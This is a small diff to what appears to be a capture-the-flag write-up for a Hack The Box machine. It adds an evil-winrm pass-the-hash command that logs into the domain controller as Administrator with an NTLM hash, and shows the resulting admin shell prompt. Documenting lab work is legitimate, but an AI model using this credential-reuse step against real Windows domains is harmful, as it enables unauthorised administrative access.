@@ -1344,6 +1344,19 @@ SMB         10.129.244.72   445    DC01             [*] grep -iv disabled /home/
 Full domain compromise
 
 ```python
+evil-winrm -i dc01.fries.htb -u Administrator -H 'a773cb05d79273299a684a23ede56748'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+```python
 
 ```
 
